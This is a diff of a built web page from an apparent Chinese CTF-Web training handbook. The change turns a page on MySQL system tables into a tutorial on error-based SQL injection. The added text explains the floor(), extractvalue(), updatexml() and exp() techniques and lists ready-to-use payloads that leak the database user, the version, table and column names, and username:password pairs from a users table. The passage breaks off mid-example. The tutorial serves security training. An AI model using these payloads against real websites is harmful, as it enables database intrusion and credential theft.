@@ -12,13 +12,13 @@
         <meta name="author" content="wilesanGH">
       
       
-        <link rel="canonical" href="https://github.com/wilesanGH/Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8%E8%AF%B4%E6%98%8E/">
+        <link rel="canonical" href="https://github.com/wilesanGH/SQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/">
       
       
-        <link rel="prev" href="../MySQL%E6%96%B0%E6%89%8B%E5%BF%85%E5%A4%87%E5%85%B3%E9%94%AE%E8%AF%8D%E6%89%8B%E5%86%8C/">
+        <link rel="prev" href="../SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/">
       
       
-        <link rel="next" href="../SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D/">
+        <link rel="next" href="../bool%E7%9B%B2%E6%B3%A8%E5%8E%9F%E7%90%86/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -26,7 +26,7 @@
     
     
       
-        <title>MySQL系统表说明 - CTF-Web修炼手册</title>
+        <title>SQL报错注入详解 - CTF-Web修炼手册</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#mysql" class="md-skip">
+        <a href="#sql" class="md-skip">
           跳转至
         </a>
       
@@ -114,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              MySQL系统表说明
+              SQL报错注入详解
             
           </span>
         </div>
@@ -901,8 +901,6 @@
                 
   
   
-    
-  
   
   
     
@@ -918,11 +916,13 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_1" >
         
           
           <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
@@ -938,7 +938,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3_1">
             <span class="md-nav__icon md-icon"></span>
             基础知识
@@ -972,30 +972,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    MySQL系统表说明
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Mysql%E7%B3%BB%E7%BB%9F%E8%A1%A8%E8%AF%B4%E6%98%8E/" class="md-nav__link">
         
   
   
@@ -1006,69 +986,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#mysql" class="md-nav__link">
-    <span class="md-ellipsis">
-      一、MySQL 系统表简介
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema" class="md-nav__link">
-    <span class="md-ellipsis">
-      二、information_schema 数据库
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      三、常见的 SQL 注入信息枚举过程
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema-sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      四、基于 information_schema 的 SQL 注入示例
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mysql-mysqluser" class="md-nav__link">
-    <span class="md-ellipsis">
-      五、MySQL 用户账户表 (mysql.user)
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1132,8 +1049,10 @@
                 
   
   
+    
   
   
+  
     
     
     
@@ -1147,13 +1066,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
         
           
           <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
@@ -1169,7 +1086,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3_2">
             <span class="md-nav__icon md-icon"></span>
             漏洞分析
@@ -1249,10 +1166,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../SQL%20%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    SQL报错注入详解
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -1263,6 +1202,113 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      什么是报错注入
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      主要报错注入方法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="主要报错注入方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-floor" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 基于 floor() 的报错注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-extractvalue" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 基于 extractvalue() 的报错注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-updatexml" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 基于 updatexml() 的报错注入
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      其他报错注入方法
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      MySQL 版本兼容性对比
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      使用建议
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御建议
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1946,6 +1992,8 @@
   
   
   
+    
+  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -1954,45 +2002,87 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      什么是报错注入
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      主要报错注入方法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="主要报错注入方法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-floor" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. 基于 floor() 的报错注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-extractvalue" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. 基于 extractvalue() 的报错注入
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-updatexml" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. 基于 updatexml() 的报错注入
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      其他报错注入方法
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#mysql" class="md-nav__link">
     <span class="md-ellipsis">
-      一、MySQL 系统表简介
+      MySQL 版本兼容性对比
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#information_schema" class="md-nav__link">
+  <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
-      二、information_schema 数据库
+      使用建议
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#sql" class="md-nav__link">
+  <a href="#_5" class="md-nav__link">
     <span class="md-ellipsis">
-      三、常见的 SQL 注入信息枚举过程
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#information_schema-sql" class="md-nav__link">
-    <span class="md-ellipsis">
-      四、基于 information_schema 的 SQL 注入示例
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#mysql-mysqluser" class="md-nav__link">
-    <span class="md-ellipsis">
-      五、MySQL 用户账户表 (mysql.user)
+      防御建议
     </span>
   </a>
   
@@ -2017,142 +2107,266 @@
   
 
 
-  <h1>MySQL系统表说明</h1>
-
-<h3 id="mysql">一、MySQL 系统表简介<a class="headerlink" href="#mysql" title="Permanent link">&para;</a></h3>
-<p>MySQL 的 <strong>系统表</strong> 存储在 <code>information_schema</code> 和 <code>mysql</code> 数据库中。它们保存了数据库的元数据，如表、列、用户权限、字符集等信息。</p>
+<h1 id="sql">SQL 报错注入详解<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">什么是报错注入<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>报错注入（Error-based SQL Injection）是一种利用数据库错误信息来获取数据的 SQL 注入技术。当应用程序没有正确处理数据库错误时，攻击者可以通过构造特殊的 SQL 语句，使数据库返回错误信息，这些错误信息中可能包含敏感数据。</p>
+<h2 id="_2">主要报错注入方法<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="1-floor">1. 基于 floor() 的报错注入<a class="headerlink" href="#1-floor" title="Permanent link">&para;</a></h3>
+<p>利用 <code>floor(rand(0)*2)</code> 配合 <code>count()</code> 和 <code>group by</code> 触发主键重复错误。当使用 <code>rand()</code> 函数时，每次查询都会产生不同的随机数，而 <code>group by</code> 需要确定的值，这就导致了主键冲突。</p>
+<p><strong>版本和配置影响</strong></p>
+<p><strong>MySQL 版本影响</strong></p>
+<blockquote>
+<p>MySQL 5.7.5 以下版本：floor() 报错注入通常有效</p>
+<p>MySQL 5.7.5 及以上版本：由于 rand() 函数改进，可能不会触发错误</p>
+<p>MySQL 8.0：完全重构了随机数生成器，floor() 报错注入基本失效</p>
+</blockquote>
+<p><strong>配置影响</strong></p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="o">#</span><span class="w"> </span><span class="err">查看当前</span><span class="w"> </span><span class="n">sql_mode</span><span class="w"> </span><span class="err">设置</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">sql_mode</span><span class="p">;</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="o">#</span><span class="w"> </span><span class="err">查看是否启用了严格模式</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;sql_mode&#39;</span><span class="p">;</span>
+</code></pre></div>
+如果启用了 <code>STRICT_TRANS_TABLES</code> 或 <code>STRICT_ALL_TABLES</code>，可能影响错误触发</p>
+<p>某些安全配置可能限制错误信息显示</p>
+<p><strong>替代方案</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="o">#</span><span class="w"> </span><span class="err">如果</span><span class="w"> </span><span class="n">floor</span><span class="p">()</span><span class="w"> </span><span class="err">方法失效，可以尝试其他报错注入方法</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="o">#</span><span class="w"> </span><span class="err">使用</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">()</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="o">#</span><span class="w"> </span><span class="err">使用</span><span class="w"> </span><span class="n">updatexml</span><span class="p">()</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="o">#</span><span class="w"> </span><span class="err">使用</span><span class="w"> </span><span class="n">exp</span><span class="p">()</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">())</span><span class="n">a</span><span class="p">))</span>
+</code></pre></div>
+<p><strong>更可靠的示例</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="o">#</span><span class="w"> </span><span class="err">方法</span><span class="mi">1</span><span class="err">：使用</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="err">表（数据量较大）</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="o">#</span><span class="w"> </span><span class="err">方法</span><span class="mi">2</span><span class="err">：使用</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="err">和子查询</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">null</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">!</span><span class="mi">1</span><span class="p">)</span><span class="n">x</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)))</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="o">#</span><span class="w"> </span><span class="err">方法</span><span class="mi">3</span><span class="err">：使用多表连接</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="k">c</span><span class="p">)</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="o">#</span><span class="w"> </span><span class="err">方法</span><span class="mi">4</span><span class="err">：使用</span><span class="w"> </span><span class="k">having</span><span class="w"> </span><span class="err">子句</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="k">having</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div>
+<blockquote>
+<p>适用于 MySQL 5.7.5 以下版本</p>
+<p>可以获取任意数据</p>
+<p>构造相对复杂</p>
+<p>需要足够的数据量才能触发错误</p>
+<p>受 MySQL 版本和配置影响较大</p>
+</blockquote>
+<h3 id="2-extractvalue">2. 基于 extractvalue() 的报错注入<a class="headerlink" href="#2-extractvalue" title="Permanent link">&para;</a></h3>
+<p><code>extractvalue()</code> 是 MySQL 的 XML 处理函数，用于从 XML 字符串中提取值。当 XML 格式不正确时，会返回错误信息，我们可以利用这个特性来获取数据。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+</code></pre></div>
+<blockquote>
+<p>构造简单</p>
+<p>返回数据长度有限制（最多32个字符）</p>
+<p>适用于 MySQL 5.1.5 及以上版本</p>
+</blockquote>
+<p><strong>处理超过32个字符的方法</strong></p>
 <ol>
 <li>
-<p><code>information_schema</code>: 存储 MySQL 数据库服务器的元数据信息，用户可以查询这些表来了解数据库的结构。</p>
+<p><strong>使用 substr() 函数分段获取</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="o">#</span><span class="w"> </span><span class="err">获取前</span><span class="mi">32</span><span class="err">个字符</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="o">#</span><span class="w"> </span><span class="err">获取接下来的</span><span class="mi">32</span><span class="err">个字符</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">33</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="o">#</span><span class="w"> </span><span class="err">获取最后的部分</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()),</span><span class="mi">65</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
+</code></pre></div></p>
 </li>
 <li>
-<p><code>mysql</code>: 存储 MySQL 用户账户、权限等安全相关的信息。通常只有高权限用户才能访问。</p>
+<p><strong>使用 mid() 函数分段获取</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="o">#</span><span class="w"> </span><span class="err">获取前</span><span class="mi">32</span><span class="err">个字符</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="o">#</span><span class="w"> </span><span class="err">获取接下来的</span><span class="mi">32</span><span class="err">个字符</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">),</span><span class="mi">33</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div></p>
+</li>
+<li>
+<p><strong>使用 limit 分页获取</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">#</span><span class="w"> </span><span class="err">获取第一行数据</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span>
